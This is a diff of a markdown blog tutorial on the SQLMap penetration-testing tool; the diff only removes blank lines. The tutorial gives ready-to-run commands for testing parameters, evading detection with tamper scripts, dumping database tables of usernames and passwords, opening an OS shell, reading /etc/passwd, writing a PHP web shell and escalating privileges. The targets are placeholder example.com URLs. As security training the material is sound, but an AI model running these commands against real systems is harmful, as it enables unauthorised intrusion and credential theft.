@@ -12,7 +12,7 @@ ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1714199532934/fe3b0
 
 ## 1\. Introduction
 
-### 1.1 What is SQLMap?
+### 1.1 What is SQLMap ?
 
 SQLMap is an open-source penetration testing tool used to detect and exploit SQL injection vulnerabilities in web applications. It automates the process of detecting and exploiting SQL injection flaws, making it an essential tool for security professionals and penetration testers.
 
@@ -37,21 +37,18 @@ To install SQLMap, follow these steps:
     
     ```plaintext
     git clone <https://github.com/sqlmapproject/sqlmap.git>
-    
     ```
     
 2. Navigate to the cloned directory:
     
     ```plaintext
     cd sqlmap
-    
     ```
     
 3. Run SQLMap using Python:
     
     ```plaintext
     python sqlmap.py
-    
     ```
     
 
@@ -61,7 +58,6 @@ The basic syntax for running SQLMap is as follows:
 
 ```plaintext
 sqlmap [options] -u <target-url>
-
 ```
 
 Some common options include:
@@ -100,7 +96,6 @@ Example:
 
 ```plaintext
 sqlmap '<http://www.example.com/?id=1>' -H 'User-Agent: Mozilla/5.0'
-
 ```
 
 ### 3.2 Testing GET and POST Parameters
@@ -109,28 +104,24 @@ To test GET parameters, use the `-u` option followed by the URL with the paramet
 
 ```plaintext
 sqlmap -u "<http://www.example.com/page.php?id=1>"
-
 ```
 
 To test POST parameters, use the `--data` option followed by the POST data:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/login.php>" --data "username=admin&password=123"
-
 ```
 
 Use the `-p` option to specify specific parameters to test:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/page.php?id=1&category=2>" -p id
-
 ```
 
 Mark the injection point with an asterisk (`*`):
 
 ```plaintext
 sqlmap -u "<http://www.example.com/page.php?id=1*&category=2>"
-
 ```
 
 ### 3.3 Using Request Files
@@ -139,7 +130,6 @@ Use the `-r` option to read the HTTP request from a file:
 
 ```plaintext
 sqlmap -r request.txt
-
 ```
 
 To save a request from Burp Suite:
@@ -155,28 +145,24 @@ Use the `--cookie` option to specify cookies:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/>" --cookie="PHPSESSID=abc123"
-
 ```
 
 Use the `-H` option to specify additional headers:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/>" -H "X-Forwarded-For: 127.0.0.1"
-
 ```
 
 Use the `--random-agent` option to randomize the User-Agent:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/>" --random-agent
-
 ```
 
 Use the `--mobile` option to simulate a mobile device:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/>" --mobile
-
 ```
 
 ### 3.5 Handling JSON and XML Requests
@@ -185,14 +171,12 @@ SQLMap supports JSON and XML POST data. Use the `--data` option for simple reque
 
 ```plaintext
 sqlmap -u "<http://www.example.com/api/>" --data '{"id":1}'
-
 ```
 
 For complex JSON or XML data, use the `-r` option with a request file:
 
 ```plaintext
 sqlmap -r json_request.txt
-
 ```
 
 ## 4\. Optimizing SQLMap Usage
@@ -203,7 +187,6 @@ Use the `-p` option to specify specific parameters to test:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/page.php?id=1&category=2>" -p id
-
 ```
 
 ### 4.2 Speeding Up Scans with Threads
@@ -212,7 +195,6 @@ Use the `--threads` option to specify the number of concurrent threads:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/>" --threads=10
-
 ```
 
 ### 4.3 Evading Detection with Tampering
@@ -221,7 +203,6 @@ SQLMap includes several tamper scripts to modify the injection payloads and evad
 
 ```plaintext
 sqlmap -u "<http://www.example.com/>" --tamper="space2comment,charencode"
-
 ```
 
 ### 4.4 Saving and Resuming Scans
@@ -230,14 +211,12 @@ Use the `--save` option to save the session to a file:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/>" --save=session.sqlite
-
 ```
 
 Use the `--resume` option to resume a saved session:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/>" --resume=session.sqlite
-
 ```
 
 ## 5\. Database Enumeration with SQLMap
@@ -248,7 +227,6 @@ Use the `--dbs` option to list available databases:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/?id=1>" --dbs
-
 ```
 
 ### 5.2 Enumerating Tables
@@ -257,7 +235,6 @@ Use the `-D` option to specify the database and the `--tables` option to list ta
 
 ```plaintext
 sqlmap -u "<http://www.example.com/?id=1>" -D testdb --tables
-
 ```
 
 ### 5.3 Dumping Table Data
@@ -266,7 +243,6 @@ Use the `-D`, `-T`, and `--dump` options to dump table data:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/?id=1>" -D testdb -T users --dump
-
 ```
 
 The `--batch` and `--dump` options in SQLMap are used to automate the SQL injection process and retrieve data from the database.
@@ -292,7 +268,6 @@ Here's an example of using `--batch` and `--dump` together:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/page.php?id=1>" -p id --batch --dump -D database_name -T table_name -C column1,column2
-
 ```
 
 In this example:
@@ -324,7 +299,6 @@ Use the `-C` option to specify columns to retrieve:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/?id=1>" -D testdb -T users -C username,password --dump
-
 ```
 
 ## 6\. Advanced SQLMap Techniques
@@ -335,7 +309,6 @@ Use the `--os-shell` option to open an interactive operating system shell:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/?id=1>" --os-shell
-
 ```
 
 ### 6.2 Reading/Writing Files
@@ -344,14 +317,12 @@ Use the `--file-read` option to read files from the server:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/?id=1>" --file-read="/etc/passwd"
-
 ```
 
 Use the `--file-write` option to write files to the server:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/?id=1>" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
-
 ```
 
 ### 6.3 Privilege Escalation
@@ -360,7 +331,6 @@ Use the `--priv-esc` option to attempt privilege escalation:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/?id=1>" --priv-esc
-
 ```
 
 ### 6.4 Cracking Password Hashes
@@ -369,7 +339,6 @@ Use the `--passwords` option to crack retrieved password hashes:
 
 ```plaintext
 sqlmap -u "<http://www.example.com/?id=1>" --passwords
-
 ```
 
 # 7.Handling SQLMap Errors
@@ -382,7 +351,6 @@ The first step in troubleshooting SQLMap errors is to use the `--parse-errors` o
 
 ```plaintext
 sqlmap -u "<http://www.example.com/vuln.php?id=1>" --parse-errors
-
 ```
 
 Example output:
@@ -395,7 +363,6 @@ Example output:
 [16:09:20] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
 [16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''YzDZJELylInm' at line 1'
 ...SNIP...
-
 ```
 
 By using this option, SQLMap will automatically print any DBMS errors, providing clarity on the issue and helping you properly fix it.
@@ -406,7 +373,6 @@ The `-t` option allows you to store the entire traffic content to an output file
 
 ```plaintext
 sqlmap -u "<http://www.example.com/vuln.php?id=1>" --batch -t /tmp/traffic.txt
-
 ```
 
 Example output:
@@ -435,7 +401,6 @@ URI: <http://www.example.com:80/?id=1>
 <!DOCTYPE html>
 <html lang="en">
 ...SNIP...
-
 ```
 
 The `/tmp/traffic.txt` file now contains all sent and received HTTP requests, allowing you to manually investigate these requests to identify where the issue is occurring.
@@ -446,7 +411,6 @@ The `-v` option increases the verbosity level of the console output. This can pr
 
 ```plaintext
 sqlmap -u "<http://www.example.com/vuln.php?id=1>" -v 6 --batch
-
 ```
 
 Example output:
@@ -501,7 +465,6 @@ URI: <http://www.example.com:80/?id=1>
 
 <body>
 ...SNIP...
-
 ```
 
 Using the `-v 6` option, SQLMap will directly print all errors and the full HTTP requests to the terminal. This allows you to follow along with everything SQLMap is doing in real-time.
@@ -512,7 +475,6 @@ The `--proxy` option redirects all SQLMap traffic through a specified proxy, suc
 
 ```plaintext
 sqlmap -u "<http://www.example.com/vuln.php?id=1>" --proxy=http://localhost:8080
-
 ```
 
 By routing all SQLMap traffic through a proxy, you can manually investigate the requests, repeat them, and utilize all the features of the proxy tool (e.g., Burp Suite) to analyze and manipulate the requests.
